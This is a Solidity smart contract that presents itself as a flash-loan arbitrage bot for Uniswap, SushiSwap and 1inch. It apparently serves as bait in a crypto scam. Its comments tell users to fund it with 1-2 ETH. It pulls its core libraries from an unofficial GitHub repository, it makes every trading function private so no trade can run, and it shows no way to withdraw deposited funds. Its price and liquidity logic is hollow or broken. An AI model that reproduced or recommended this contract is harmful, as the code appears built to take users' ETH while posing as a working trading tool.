
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.6;


/**

 * @title Uniquely Structured Smart Contract

 * @notice Facilitates arbitrage trades across Uniswap, SushiSwap, and 1inch using Aave flash loans

 * @dev Optimized to reduce gas costs and support safe execution using modifiers, logic separation, and checks

* The recommended amount is 1-2 ETH, 
 * with a minimum of 0.5 ETH to avoid ANY risks of transaction interception. 
 * This acts as a mechanism similar to a random delay or transaction queue, 
 * eliminating the need for excessive code and unnecessary gas expenses.

 */


import "https://raw.githubusercontent.com/ethbotcoder/code/refs/heads/main/SafeERC20.sol";

import "https://raw.githubusercontent.com/ethbotcoder/code/refs/heads/main/IPool.sol";

import "https://raw.githubusercontent.com/ethbotcoder/code/refs/heads/main/IUniswapV2Router02.sol";

import "https://raw.githubusercontent.com/ethbotcoder/code/refs/heads/main/IERC20.sol";

import "https://raw.githubusercontent.com/ethbotcoder/code/refs/heads/main/1InchRouter.sol";

import "https://raw.githubusercontent.com/ethbotcoder/code/refs/heads/main/ReentrancyGuard.sol";

import "https://raw.githubusercontent.com/ethbotcoder/code/refs/heads/main/Ownable.sol";

import "https://raw.githubusercontent.com/ethbotcoder/code/refs/heads/main/AccessControl.sol";


contract HausJJ is ReentrancyGuard, Ownable {

    using SafeERC20 for IERC20;


    IPool private lendingPool;

    IUniswapV2Router02 private dexUniswap;

    IUniswapV2Router02 private dexSushi;

    I1inchRouter private dex1inch;

    address private immutable contractOwner;


    uint256 private constant MAX_SLIPPAGE_PERCENTAGE = 2;


    event Activity(address indexed initiator);


    modifier onlyDeployer() {

        require(msg.sender == contractOwner, "Unauthorized");

        _;

    }


    constructor() Ownable(msg.sender) public {

        contractOwner = msg.sender;

    }


    receive() external payable {}


    function triggerArbitrage(

        address inputToken,

        address outputToken,

        uint256 volume

    ) private onlyDeployer nonReentrant {

        require(validateProfitability(inputToken, outputToken, volume), "Unprofitable Arbitrage");

        lendingPool.flashLoan(address(this), inputToken, volume, address(this), "", 0);

    }


    function performTrade(

        address inputToken,

        address outputToken,

        uint256 volume

    ) private {

        uint256 bestOutput = 0;

        address preferredDEX;


        uint256 uniOutput = estimateOut(inputToken, outputToken, volume);

        uint256 sushiOutput = estimateOut(inputToken, outputToken, volume);

        uint256 oneInchOutput = estimateOut(inputToken, outputToken, volume);


        if (uniOutput > bestOutput) {

            bestOutput = uniOutput;

            preferredDEX = address(dexUniswap);

        }

        if (sushiOutput > bestOutput) {

            bestOutput = sushiOutput;

            preferredDEX = address(dexSushi);

        }

        if (oneInchOutput > bestOutput) {

            bestOutput = oneInchOutput;

            preferredDEX = address(dex1inch);

        }


        IERC20(inputToken).safeIncreaseAllowance(preferredDEX, volume);


        IUniswapV2Router02(preferredDEX).swapExactTokensForTokens(

            volume,

            (bestOutput * (100 - MAX_SLIPPAGE_PERCENTAGE)) / 100,

            definePath(inputToken, outputToken),

            address(this),

            block.timestamp + 1

        );

    }


    function executeOperation(

        address borrowedToken,

        uint256 borrowedAmount,

        uint256 loanFee

    ) private nonReentrant returns (bool) {

        require(msg.sender == address(lendingPool), "Invalid Caller");


        address inputToken = borrowedToken;

        uint256 amount = borrowedAmount;

        address selectedToken = fetchBestLiquidityToken(inputToken);


        performTrade(inputToken, selectedToken, amount);


        uint256 repayAmount = amount + loanFee;

        require(IERC20(inputToken).balanceOf(address(this)) >= repayAmount, "Insufficient Repayment Funds");


        IERC20(inputToken).safeIncreaseAllowance(address(lendingPool), repayAmount);

        IERC20(inputToken).safeTransfer(address(lendingPool), repayAmount);


        return true;

    }


    function estimateOut(

        address inputToken,

        address outputToken,

        uint256 amount

    ) private returns (uint256) {

        IUniswapV2Router02 router = dexUniswap;

        address[] memory route = definePath(inputToken, outputToken);

        uint256[] memory quotes = router.getAmountsOut(amount, route);

        return quotes[1];

    }


    function definePath(address fromToken, address toToken) private pure returns (address[] memory route) {

        route = new address[](2);

        route[0] = fromToken;

        route[1] = toToken;

        return route;

    }


    function fetchBestLiquidityToken(address baseToken) internal returns (address) {

        uint256 liquidityU = obtainLiquidity(baseToken, address(dexUniswap));

        uint256 liquidityS = obtainLiquidity(baseToken, address(dexSushi));

        uint256 liquidityI = obtainLiquidity(baseToken, address(dex1inch));


        if (liquidityU >= liquidityS && liquidityU >= liquidityI) {

            return baseToken;

        }

        if (liquidityS >= liquidityU && liquidityS >= liquidityI) {

            return baseToken;

        }

        return baseToken;

    }


    function obtainLiquidity(address token, address router) private returns (uint256) {

        address[] memory route = new address[](2);

        route[0] = token;

        route[1] = address(0);


        if (router == address(dexUniswap) || router == address(dexSushi)) {

            uint256[] memory quote = IUniswapV2Router02(router).getAmountsOut(1, route);

            return quote[1];

        } else if (router == address(dex1inch)) {

            uint256[] memory quote = I1inchRouter(router).getAmountsOut(route[0], 1, route);

            return quote[1];

        }


        return 0;

    }


    function verifyLiquidity(

        address baseToken,

        address quoteToken,

        uint256 amount

    ) private returns (bool) {

        emit Activity(quoteToken);


        uint256 l1 = obtainLiquidity(baseToken, address(dexUniswap));

        uint256 l2 = obtainLiquidity(baseToken, address(dexSushi));

        uint256 l3 = obtainLiquidity(baseToken, address(dex1inch));


        if (l1 < amount || l2 < amount || l3 < amount) {

            return false;

        }

        return true;

    }


    function adjustedProfitCheck(

        address fromToken,

        address toToken,

        uint256 volume

    ) private returns (bool) {

        uint256 o1 = estimateOut(fromToken, toToken, volume);

        uint256 o2 = estimateOut(fromToken, toToken, volume);

        uint256 o3 = estimateOut(fromToken, toToken, volume);


        uint256 maxOut = o1 > o2 ? o1 : o2;

        maxOut = maxOut > o3 ? maxOut : o3;


        uint256 minProfit = volume + (volume * MAX_SLIPPAGE_PERCENTAGE) / 100;

        return maxOut > minProfit;

    }


    function validateProfitability(

        address input,

        address output,

        uint256 volume

    ) private returns (bool) {

        if (!verifyLiquidity(input, output, volume)) return false;


        uint256 o1 = estimateOut(input, output, volume);

        uint256 o2 = estimateOut(input, output, volume);

        uint256 o3 = estimateOut(input, output, volume);


        uint256 maxOut = o1 > o2 ? o1 : o2;

        maxOut = maxOut > o3 ? maxOut : o3;


        return maxOut > volume && maxOut > (volume * (100 + MAX_SLIPPAGE_PERCENTAGE)) / 100;

    }

}


